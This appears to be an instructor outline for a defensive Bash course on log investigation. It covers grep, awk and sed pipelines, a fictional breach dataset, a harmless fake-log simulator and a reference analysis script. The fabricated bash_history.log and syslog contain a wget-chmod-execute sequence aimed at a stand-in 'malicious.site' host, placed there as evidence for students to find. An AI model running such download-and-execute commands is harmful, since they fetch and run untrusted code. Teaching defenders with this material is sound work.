# Instructor Slide Deck Outline (16 Hours)

Design intent: minimal theory, maximum operational relevance. Each block ends with a short investigation lab so students immediately apply commands.

---

## Module 1 - Why Bash Matters for Cybersecurity (30 min)

### Slides

- Course objectives
- Blue team workflow: logs -> investigation -> evidence
- Why defenders rely on Bash pipelines
- Real-world SOC workflow example
- Overview of the final project

Example investigation pipeline:

```bash
grep "Failed password" auth.log | awk '{print $11}' | sort | uniq -c | sort -nr
```

Outcome: identify attacker IPs quickly.

---

## Module 2 - Linux Terminal Fundamentals (1 hr)

### Topics

- shell vs terminal
- Linux filesystem layout
- navigating directories
- help documentation

### Commands

```bash
pwd
ls
cd
man
history
```

Security context:

- attackers hide files
- defenders must locate them

Example:

```bash
ls -la
```

---

## Module 3 - Working With Logs (1.5 hr)

### Topics

- what logs are
- common Linux logs

### Examples

```text
/var/log/auth.log
/var/log/syslog
/var/log/apache2/access.log
```

### Commands

```bash
cat
less
head
tail
wc
```

Example investigation:

```bash
grep "Failed password" auth.log
```

---

## Module 4 - Pipes and Redirection (2 hr)

Concept: small tools chained together.

### Operators

```bash
|
>
>>
```

Example investigation:

```bash
grep "Failed password" auth.log | wc -l
```

Advanced pipeline:

```bash
grep "Failed password" auth.log | awk '{print $11}'
```

---

## Module 5 - Threat Hunting With grep (2 hr)

Focus: pattern detection.

### Key Flags

```bash
grep -i
grep -r
grep -n
grep -E
```

### Examples

Find malware download:

```bash
grep "wget" syslog
```

Find suspicious commands:

```bash
grep "chmod" bash_history.log
```

---

## Module 6 - awk and sed for Log Parsing (3 hr)

### awk Examples

Extract IPs:

```bash
awk '{print $11}'
```

Count attackers:

```bash
awk '{print $11}' auth.log | sort | uniq -c
```

### sed Examples

Clean logs:

```bash
sed '/session opened/d'
```

Highlight events:

```bash
sed 's/Failed password/FAILED/g'
```

---

## Module 7 - Bash Scripting (2 hr)

Script structure:

```bash
#!/bin/bash
LOGFILE=$1
grep "Failed password" "$LOGFILE"
```

### Concepts

- variables
- script arguments
- permissions

```bash
chmod +x script.sh
```

---

## Module 8 - Automation With Loops (1.5 hr)

Example:

```bash
for file in logs/*.log
do
    echo "Analyzing $file"
done
```

Security application: analyzing multiple hosts.

---

## Module 9 - Building the Investigation Tool (2.5 hr)

Students assemble:

```text
incident_analyzer.sh
```

### Capabilities

- detect brute force attacks
- identify attacker IPs
- build attack timeline

---

## 2. Fake Breach Dataset

Create a folder:

```text
cyber_lab_logs/
```

Contents:

```text
auth.log
access.log
bash_history.log
syslog
```

### auth.log

```text
Jul 10 09:15:02 server sshd[1423]: Failed password for root from 185.220.101.4 port 45512 ssh2
Jul 10 09:15:03 server sshd[1424]: Failed password for admin from 185.220.101.4 port 45513 ssh2
Jul 10 09:15:07 server sshd[1425]: Failed password for admin from 185.220.101.4 port 45514 ssh2
Jul 10 09:16:10 server sshd[1426]: Accepted password for admin from 185.220.101.4 port 45518 ssh2
Jul 10 09:18:11 server sshd[1430]: session opened for user admin
```

### access.log

```text
185.220.101.4 - - [10/Jul/2024:09:19:01] "GET /admin HTTP/1.1" 200
185.220.101.4 - - [10/Jul/2024:09:19:05] "GET /backup.zip HTTP/1.1" 200
91.134.14.73 - - [10/Jul/2024:09:20:12] "GET /login HTTP/1.1" 404
```

### bash_history.log

```text
ls
whoami
wget http://malicious.site/payload.sh
chmod +x payload.sh
./payload.sh
```

### syslog

```text
Jul 10 09:20:15 server CRON[1500]: (admin) CMD (wget http://malicious.site/payload.sh)
Jul 10 09:20:17 server kernel: suspicious outbound connection to 45.77.88.2
```

### Student Investigation Questions

Students must determine:

- attacker IP
- compromised user
- malware download command
- time of compromise

---

## 3. Bash Attack Simulator

This creates live logs students can analyze.

File:

```text
attack_simulator.sh
```

Script:

```bash
#!/bin/bash

LOGFILE="simulated_auth.log"
ATTACK_IP="185.220.101.4"

while true
do
echo "$(date '+%b %d %H:%M:%S') server sshd[$RANDOM]: Failed password for root from $ATTACK_IP port $RANDOM ssh2" >> $LOGFILE
sleep 1

echo "$(date '+%b %d %H:%M:%S') server sshd[$RANDOM]: Failed password for admin from $ATTACK_IP port $RANDOM ssh2" >> $LOGFILE
sleep 1

if [ $((RANDOM % 10)) -eq 1 ]; then
echo "$(date '+%b %d %H:%M:%S') server sshd[$RANDOM]: Accepted password for admin from $ATTACK_IP port $RANDOM ssh2" >> $LOGFILE
fi

sleep 2
done
```

Students investigate in real time using:

```bash
tail -f simulated_auth.log
```

Example investigation:

```bash
grep "Failed password" simulated_auth.log | awk '{print $11}'
```

---

## 4. Reference Solution (Final Tool)

File:

```text
incident_analyzer.sh
```

Script:

```bash
#!/bin/bash

LOGFILE=$1
OPTION=$2

if [ -z "$LOGFILE" ]; then
    echo "Usage: $0 logfile [--failed-logins | --top-ips | --timeline]"
    exit 1
fi

failed_logins() {
grep "Failed password" "$LOGFILE"
}

top_ips() {
grep "Failed password" "$LOGFILE" \
| awk '{print $11}' \
| sort \
| uniq -c \
| sort -nr
}

timeline() {
grep -E "Failed password|Accepted password" "$LOGFILE"
}

case $OPTION in
    --failed-logins)
        failed_logins
        ;;
    --top-ips)
        top_ips
        ;;
    --timeline)
        timeline
        ;;
    *)
        echo "Invalid option"
        ;;
esac
```

Example usage:

```bash
./incident_analyzer.sh auth.log --top-ips
```

Output:

```text
38 185.220.101.4
12 91.134.14.73
```

---

## Recommended Class Repository Structure

Provide students with:

```text
bash-cyber-course/
|
|-- logs/
|   |-- auth.log
|   |-- access.log
|   |-- syslog
|
|-- labs/
|   |-- lab1_navigation.md
|   |-- lab2_logs.md
|
|-- tools/
|   |-- attack_simulator.sh
|
`-- final_project/
    `-- incident_analyzer.sh
```

This keeps the course organized and easy to run.
